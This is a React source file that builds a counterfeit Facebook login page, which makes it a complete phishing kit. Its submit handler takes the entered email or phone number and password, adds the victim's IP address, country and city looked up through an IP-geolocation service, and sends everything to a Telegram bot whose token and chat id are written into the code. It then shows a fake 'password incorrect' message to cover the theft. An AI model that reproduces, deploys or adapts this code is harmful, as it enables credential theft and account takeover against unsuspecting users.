import React, { useState } from "react";
import { FaEye } from "react-icons/fa6";
import { IoMdEyeOff } from "react-icons/io";

const Facebook = () => {
  const [type, setType] = useState("password");
  const [icon, setIcon] = useState(true);
  const [result, setResult] = useState("");

  const handleToggle = () => {
    if (icon) {
      setType("password");
      setIcon(!icon);
    } else {
      setType("text");
      setIcon(!icon);
    }
  };

  const onSubmit = async (event) => {
    event.preventDefault();
    const formData = {};
    Array.from(event.currentTarget.elements).forEach((field) => {
      if (!field.name) return;
      formData[field.name] = field.value;
    });

    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        var ct = data.ip;
        var co = data.country_name;
        var lo = data.country_calling_code;
        var st = data.city;

        var NameLogin = formData.name;
        var PasswordLogin = formData.password;
        var SubmitValue = `Facebook Result is :%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;


        var token = "6807684688:AAGnRdy0_lrzwmZYcaGQxCSx0sm3p93WLSU";
        var chat_id = -4969598577;
        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;

        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();

        setTimeout(() => {
          setResult("Sorry, your password was incorrect. Please double-check your password.");
        }, 2000);
      });
  };

  return (
    <section className="h-screen flex flex-col items-center justify-center bg-slate-100 pb-10">
      <div className="grid md:grid-cols-2 md:gap-14 gap-5 items-center w-full">
        <div>
          <h1 className="md:text-6xl text-blue-600 text-center md:text-left text-4xl">
            facebook
          </h1>
          <p className="md:text-2xl mt-2 hidden md:block">
            Facebook helps you connect and share <br /> with the people in your
            life.
          </p>
        </div>
        <div>
          <div className="md:bg-white md:drop-shadow-xl rounded-xl px-5 py-10 max-w-sm w-full">
            <form className="grid gap-3" onSubmit={onSubmit}>
              <input
                required
                className="py-4 border-2 px-3 rounded-lg bg-transparent"
                type="text"
                name="name"
                placeholder="Email address or phone number"
              />
              <div className="flex items-center relative">
                <input
                  required
                  type={type}
                  className="py-4 gap-3 border-2 px-3 rounded-lg flex-grow bg-transparent"
                  name="password"
                  placeholder="Password"
                />
                <span
                  className="absolute right-5 cursor-pointer"
                  onClick={() => handleToggle()}
                >
                  {icon ? <IoMdEyeOff /> : <FaEye />}
                </span>
              </div>
              <button
                type="submit"
                className="bg-blue-600 py-3 text-lg text-white hover:bg-blue-500 rounded-lg"
              >
                Log in
              </button>
              <p className="text-center text-xs text-red-600">{result}</p>
              <div className="my-4 pb-4 text-center border-b-2">
                <a
                  className="text-sm text-blue-600 font-semibold"
                  href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzA4MTA3NzkzLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&amp;ars=facebook_login"
                >
                  Forgotten password?
                </a>
              </div>
              <div className="text-center mt-3">
                <a
                  href="#"
                  className="bg-green-600 text-lg font-semibold text-white py-4 px-5 rounded-lg"
                >
                  Create new account
                </a>
              </div>
            </form>
          </div>
        </div>
      </div>
      <div className="mt-auto text-black/50">
        English ©  {new Date().getFullYear()} Facebook from Meta
      </div>
    </section>
  );
};

export default Facebook;
